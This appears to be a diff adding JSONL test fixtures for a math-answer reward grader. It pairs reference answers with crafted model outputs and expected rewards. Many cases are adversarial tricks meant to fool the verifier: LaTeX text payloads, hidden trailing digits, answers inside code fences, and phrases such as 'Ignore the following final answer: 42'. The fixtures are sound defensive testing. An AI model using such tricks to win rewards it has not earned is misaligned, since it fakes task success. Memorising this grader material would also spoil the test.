+{"case_id":"juxtaposition-valid-001","category":"ambiguous_juxtaposition","reference":"2*x+2","prediction":"\\boxed{2(x+1)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"juxtaposition-valid-002","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0+0\\cdot7+42}","expected_reward":1,"expected_status":"match"}
+{"case_id":"text-payload-001","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{ wrong}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-002","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{ is false}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-003","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{ maybe 7}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-004","category":"text_payload","reference":"42","prediction":"\\boxed{42\\mathrm{wrong}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-005","category":"text_payload","reference":"42","prediction":"\\boxed{42\\mbox{wrong}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-006","category":"text_payload","reference":"42","prediction":"\\boxed{42\\textrm{wrong 7}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-007","category":"text_payload","reference":"42","prediction":"\\boxed{42\\mathit{wrong}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-008","category":"text_payload","reference":"42","prediction":"\\boxed{42\\textnormal{wrong}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-009","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{错误}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-payload-010","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{not\\ correct}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"text-unit-valid-001","category":"text_payload","reference":"42","prediction":"\\boxed{42\\text{ cm}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"text-unit-valid-002","category":"text_payload","reference":"42","prediction":"\\boxed{42\\mathrm{kg}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"text-unit-valid-003","category":"text_payload","reference":"42","prediction":"\\boxed{42\\mbox{ meters}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"text-unit-valid-004","category":"text_payload","reference":"42","prediction":"\\boxed{42\\textnormal{square meters}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"normalization-drop-001","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\displaystyle42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-002","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\ldots42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-003","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\$42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-004","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\"42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-005","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0'42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-006","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\\\pi+42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-function-001","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0\\max(42)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-function-002","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{x=0\\min(42)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"function-script-valid-001","category":"ambiguous_juxtaposition","reference":"\\sin^2(x)","prediction":"\\boxed{\\sin^{2}(x)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"function-script-valid-002","category":"ambiguous_juxtaposition","reference":"\\cos^2(x)","prediction":"\\boxed{\\cos^{2}(x)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"function-script-valid-003","category":"ambiguous_juxtaposition","reference":"3","prediction":"\\boxed{\\log_{2}(8)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"operatorname-valid-001","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{\\operatorname{gcd}(42,42)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"operatorname-valid-002","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{\\operatorname{lcm}(6,7)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"normalization-drop-007","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\negmedspace42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"normalization-drop-008","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\negthickspace42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"inline-code-001","category":"injection_payload","reference":"42","prediction":"`\\boxed{42}`","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"inline-code-002","category":"injection_payload","reference":"42","prediction":"`Final answer: 42`","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"inline-code-003","category":"answer_surface_precedence","reference":"42","prediction":"\\boxed{7} then `\\boxed{42}`","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"inline-code-004","category":"injection_payload","reference":"42","prediction":"Final answer: `42`","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"negated-marker-001","category":"unanchored_prose","reference":"42","prediction":"Wrong answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-002","category":"unanchored_prose","reference":"42","prediction":"This is not the final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-003","category":"unanchored_prose","reference":"42","prediction":"候选答案：42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"juxtaposition-mleft-001","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0\\mleft(42\\mright)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-mleft-002","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{(0)\\mleft[42\\mright]}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"tilde-fence-001","category":"injection_payload","reference":"42","prediction":"~~~\n\\boxed{42}\n~~~","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"tilde-fence-002","category":"injection_payload","reference":"42","prediction":"~~~latex\nFinal answer: 42\n~~~","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-004","category":"unanchored_prose","reference":"42","prediction":"This is not my final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-005","category":"unanchored_prose","reference":"42","prediction":"This isn't the final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-006","category":"unanchored_prose","reference":"42","prediction":"Fake answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-007","category":"unanchored_prose","reference":"42","prediction":"Previous answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-008","category":"unanchored_prose","reference":"42","prediction":"Do not use this answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-009","category":"unanchored_prose","reference":"42","prediction":"Ignore the following final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-010","category":"unanchored_prose","reference":"42","prediction":"A non-final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"negated-marker-valid-001","category":"answer_surface_precedence","reference":"42","prediction":"Wrong answer: 7; corrected final answer: 42","expected_reward":1,"expected_status":"match"}
+{"case_id":"fence-tail-001","category":"injection_payload","reference":"42","prediction":"~~~lang\ncode\n~~~ \\boxed{42}","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"fence-tail-002","category":"injection_payload","reference":"42","prediction":"~~~lang\ncode\n~~~ Final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"fence-tail-003","category":"injection_payload","reference":"42","prediction":"```lang\ncode\n``` \\boxed{42}","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"fence-tail-004","category":"injection_payload","reference":"42","prediction":"```lang\ncode\n``` Final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"fence-close-valid-001","category":"answer_surface_precedence","reference":"42","prediction":"~~~lang\ncode\n~~~\n\\boxed{42}","expected_reward":1,"expected_status":"match"}
+{"case_id":"fence-close-valid-002","category":"answer_surface_precedence","reference":"42","prediction":"```lang\ncode\n```\nFinal answer: 42","expected_reward":1,"expected_status":"match"}
+{"case_id":"numeric-subscript-001","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{42_7}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-subscript-002","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{42_{x}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"transpose-suffix-001","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{42^T}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"transpose-suffix-002","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{42^{\\top}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"invalid-reference-005","category":"invalid_reference","reference":"42\\text{ wrong}","prediction":"\\boxed{42}","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"invalid-reference-006","category":"invalid_reference","reference":"0(42)","prediction":"\\boxed{42}","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"inline-code-valid-001","category":"answer_surface_precedence","reference":"42","prediction":"`code` then \\boxed{42}","expected_reward":1,"expected_status":"match"}
